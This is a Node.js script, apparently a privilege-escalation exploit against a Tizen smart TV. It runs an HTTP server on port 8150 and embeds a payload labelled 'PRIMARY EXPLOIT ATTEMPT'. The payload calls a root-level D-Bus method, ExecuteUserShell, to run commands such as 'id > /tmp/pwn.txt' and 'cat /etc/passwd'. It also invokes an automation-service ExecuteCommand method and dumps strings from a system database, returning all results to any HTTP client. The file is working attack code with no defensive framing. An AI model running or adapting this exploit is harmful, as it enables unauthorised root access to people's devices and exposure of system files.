'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8150;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe62h.txt';

var INNER = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var result = {};',

  // PRIMARY EXPLOIT ATTEMPT: ExecuteUserShell on com.jackpack.migration (uid=0)
  // Try escalating commands
  'var cmds = [',
  '  "id",',
  '  "id > /tmp/pwn.txt 2>&1",',
  '  "id > /home/owner/share/tmp/sdk_tools/pwn.txt 2>&1",',
  '  "cat /etc/passwd | head -5"',
  '];',
  'result.exec_user_shell = {};',
  'cmds.forEach(function(cmd) {',
  '  try {',
  '    var r = cp.execSync(',
  '      "dbus-send --system --dest=com.jackpack.migration --type=method_call --print-reply /com/jackpack/migration com.jackpack.migration.ExecuteUserShell string:\'" + cmd + "\' 2>&1",',
  '      {timeout:8000}',
  '    );',
  '    result.exec_user_shell[cmd] = r.toString();',
  '  } catch(e) {',
  '    result.exec_user_shell[cmd+"_err"] = (e.stderr ? e.stderr.toString() : "") + " | " + (e.stdout ? e.stdout.toString() : "") + " | " + e.message.slice(0,100);',
  '  }',
  '});',

  // Check if /tmp/pwn.txt was written
  'try { result.pwn_txt = fs.readFileSync("/tmp/pwn.txt","utf8"); } catch(e) { result.pwn_txt_err = e.message; }',
  'try { result.pwn_sdk = fs.readFileSync("/home/owner/share/tmp/sdk_tools/pwn.txt","utf8"); } catch(e) { result.pwn_sdk_err = e.message; }',

  // Also try with double-quotes instead of single quotes for shell
  'try {',
  '  var r2 = cp.execSync(',
  '    \'dbus-send --system --dest=com.jackpack.migration --type=method_call --print-reply /com/jackpack/migration com.jackpack.migration.ExecuteUserShell string:id 2>&1\',',
  '    {timeout:8000}',
  '  );',
  '  result.exec_shell_id_bare = r2.toString();',
  '} catch(e) {',
  '  result.exec_shell_id_bare_err = (e.stderr ? e.stderr.toString() : "") + " | " + (e.stdout ? e.stdout.toString() : "") + " | " + e.message.slice(0,100);',
  '}',

  // Try ExecuteCommand on automation-service with captured stdout/stderr separately
  'try {',
  '  var r3 = cp.spawnSync("dbus-send", [',
  '    "--system", "--dest=org.tizen.tv.automation-service",',
  '    "--type=method_call", "--print-reply",',
  '    "/TIFacAutoObj",',
  '    "org.tizen.tv.automation-service.TIFacAutoObj.ExecuteCommand",',
  '    "int32:0", "int32:0"',
  '  ], {timeout:5000});',
  '  result.exec_cmd_spawnout = r3.stdout ? r3.stdout.toString() : "";',
  '  result.exec_cmd_spawnerr = r3.stderr ? r3.stderr.toString() : "";',
  '  result.exec_cmd_spawnstatus = r3.status;',
  '} catch(e) { result.exec_cmd_spawn_err = e.message; }',

  // Check webappservice.db contents — wasutility reads this, it's writable
  'try {',
  '  var wdbuf = fs.readFileSync("/opt/dbspace/.webappservice.db");',
  '  result.webappservice_db_head = wdbuf.slice(0,100).toString("hex");',
  '  result.webappservice_db_size = wdbuf.length;',
  '  // Look for string content in the DB',
  '  var dbStr = wdbuf.toString("ascii");',
  '  var strs = [];',
  '  var i = 0, start = 0;',
  '  while(i < dbStr.length) {',
  '    if(dbStr.charCodeAt(i) === 0 || dbStr.charCodeAt(i) < 32) {',
  '      if(i - start > 6) {',
  '        var s = dbStr.slice(start, i);',
  '        if(s.match(/[a-zA-Z]/)) strs.push(s);',
  '      }',
  '      start = i + 1;',
  '    }',
  '    i++;',
  '  }',
  '  result.webappservice_db_strings = strs.filter(function(s){return s.length>6;}).slice(0,30);',
  '} catch(e) { result.webappservice_db_err = e.message; }',

  'var out = JSON.stringify(result, null, 2);',
  'try { require("fs").writeFileSync("' + PROBE_FILE + '", out); } catch(e) {}',
  'process.stdout.write(out);'
].join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 60000 }, function(err, stdout, stderr) {
    var result;
    if (err) {
      result = JSON.stringify({ exec_error: err.message, stderr: stderr, stdout: stdout || '' });
    } else {
      result = stdout || '(empty)';
    }
    cb(result);
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(result) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(result);
  });
});

server.listen(PORT, function() {
  runProbe(function(result) {
    try { fs.writeFileSync(PROBE_FILE, result); } catch(e) {}
  });
});
